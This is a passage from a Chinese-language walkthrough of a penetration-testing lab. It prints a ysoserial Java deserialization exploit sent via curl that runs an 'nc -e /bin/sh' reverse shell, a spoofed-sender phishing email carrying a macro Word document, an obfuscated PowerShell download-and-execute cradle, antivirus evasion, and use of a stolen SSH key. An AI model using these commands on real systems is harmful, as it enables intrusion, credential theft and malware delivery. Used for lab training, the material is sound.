这是一个以md5形式存储用户名和密码哈希的Java对象。尝试改变名称a.petrov大小写，但是不起作用。客户端设置的对象到达服务器后将被恢复，按照这个思路做下去：
将对象从base64字符串形式恢复为二进制格式然后再恢复到内存（反序列化）时，[可以](http://frohoff.github.io/appseccali-marshalling-pickles/)执行任意代码（Jenkins漏洞就是这样）。我们可以使用[ysoserial工具](https://github.com/frohoff/ysoserial/releases)在服务器上执行任意命令。其原理是生成一个Java对象，在反序列化时执行需要的命令（在本文例子中是反弹shell）。
通过下面的命令将ysoserial生成的内容以base64-cookie的形式发送到bash：
curl -b ‘userInfo=”‘$(java -jar ysoserial-0.0.4-all.jar CommonsCollections1
‘nc -e /bin/sh 172.16.0.2 1235’ | base64 | tr -d ‘\n’)'”‘
‘http://192.168.1.2:8080/index.jsp’
执行期间发生错误：
我们发现同样的问题在[github](https://github.com/frohoff/ysoserial/issues/17)中被指出，并且已在代码仓库中修复，但尚未编译在发行版中。所以需要git
clone新版本，安装maven并在本地编译得到修复后的程序。
xxxxxxxxxx
apt-get install maven
git clone https://github.com/frohoff/ysoserial.gi
mvn compile package
将程序更新到Commons-Collections5：
curl -b ‘userInfo=”‘$(java -jar ysoserial-0.0.5-SNAPSHOT-all.jar
CommonsCollections5 ‘nc -e /bin/sh 172.16.0.2 1235’ | base64 | tr -d ‘\n’)'”‘
‘http://192.168.1.2:8080/index.jsp’
在ssh服务器上监听端口1235，得到shell。
在根文件夹中找到token.txt，这样只剩下一个token了。
在研究了一个小门户后，我们在crontab中发现了一些有趣的东西：邮件check脚本，其中包含邮件中的B.muncy用户名和密码。
## Roundcube Mail
发现是Roundcube服务器，虽然Roundcube存在许多漏洞，但是这里所有已知的漏洞都被修复了。
让我们试试其他途径。我们使用b.muncy的密码登录
进入邮箱：邮箱是空的。但是，由于门户网站有一个自动检查邮件的机器人，我们会尝试向我们已知的其他帐户发送邮件。
其中一个r.diaz回信了！我们正在尝试向他发送其他内容。
我们得到了答案：
在与机器人交谈之后，发现需要使用社会工程学。我们尝试向bot发送不同的文件：PDF，Word文档等。机器人对其中一个作出了反应！
如果您在附件中发送Word文档，它会发出一个token和一条消息，指出只有来自r.lampman的文件才能打开。我们试着去做吧！
## Terminal
在终端服务器上，rdp的端口3389关闭，其余部分没什么有用的。无论如何，需要r.diaz打开Word文档！
我假设Microsoft Security
Essentials安装在终端服务器上，就像它在terminal2上一样，并在本地安装了具有相同防病毒功能的Windows，以便在发送文档之前在现场进行测试。
在这种情况下，攻击变成了多阶段。要在终端上进行会话，我们需要：
  * 学习如何从r.lampman发送r.diaz邮件（我们没有他的邮箱密码），
  * 使用反向shell payload创建文档，
  * 绕过Microsoft Security Essentials防病毒软件，
  * 在计算机端口443上监听（仅从网络内部打开80和443）。
###  发送信件
通过脚本使用b.muncy登录（但将发件人设置为r.lampman）向r.diaz发送邮件。
这里有几件重要的事情：
  * 替换FROM字段的值
  * 替换正确的MIME类型，以便明确发送Word文档
  * 不要忘记在base64中对文档进行编码，以免在传输过程中被破坏
  * 将172.16.0.1的587端口转发到本地机器：
###  生成有效Payload
现在需要创建一个通过杀软检测的Word文档。经过对此尝试后（在真正的攻击之前，可以在本地环境中进行测试），终于找到了一个可行的版本。
我们不会立即将整个Payload保存到文档中，而是将其从我们的服务器下载。为此，我们将执行以下操作：
1.使用setoolkit创建有效Payload：
选择选项1（社会工程攻击），然后选择9（Powershell攻击向量），然后选择1（Powershell Alphanumeric Shellcode
Injector）：
在本地计算机上启动Web服务并从/root/.set/reports/powershell复制生成的Payload到/var/www/html/payload.txt：
检查文件是否可访问：
2.创建文档
我利用[这篇文章的方法](http://null-byte.wonderhowto.com/how-to/create-obfuscate-virus-inside-microsoft-word-document-0167780/)
首先需要混淆下载Payload的命令：
powershell.exe “IEX ((new-object
net.webclient).downloadstring(‘http:///payload.txt’))”
为此，可以使用[此处的Java
applet](https://www.dropbox.com/s/38g95s4g2v7eclj/Obfuscate.jar?dl=0)，运行：
输入：
powershell.exe “IEX ((new-object
net.webclient).downloadstring(‘http:///payload.txt’))”
获取结果并粘贴到文档中。以防万一我添加了Document_Open()。
需要注意的是，添加宏时，应使用docm扩展名将其保存在文档中，而不是保存在Normal模板中。
现在还差最后一步。
3.启动Metasploit
在发布之前，我们再次整理下要点：
  * Payload可从获得。
  * 172.16.0.1:587被转发到本地127.0.0.1。
  * 该文档与发送邮件的脚本一起置于文件夹中。
速度！
在一分钟内：
转到C:\Users\r.diaz\Desktop 获取token！
## SSH-TEST – 最后的障碍
最后一个服务器，到目前为止我们还没有在网络中找到任何线索。我们扫描完所有端口后，也没有任何开放端口的响应。如图，几乎所有端口都使用RST数据包（closed）对我们做出响应，并且剩下的三个也丢弃了所有访问数据包。
这表明这些端口需要“knock”，希望端口22（ssh）能够以正确的组合打开，使得我们将有时间连接它。
顺便一提，在拿下ssh服务器一开始，我们在用户d.nash的.ssh文件夹中找到了密钥，可以确定的是在这里能派到用场：
因此，执行以下操作来“knock”开正确的端口：
使用sshuttle直接转到服务器（需要指定所需的子网以保持互联网正常访问）：
将d.nash id_rsa密钥复制到本地：
安装knock实用程序，它将knock必要的端口：
尝试这三个端口的6种组合，其中一种工作正常！
这是最后一个token！成功过关！
## 后记
本文档仅介绍了通关的一种方法。我相信有很多选择。如果你知道一些有趣的方法来解决这个或那个问题，我在这里没有提到，我很乐意在评论中了解它。
我希望这篇文章能够帮助那些尚未与Pentest合作的人进入信息安全领域并尝试真正的实际测试。祝你好运！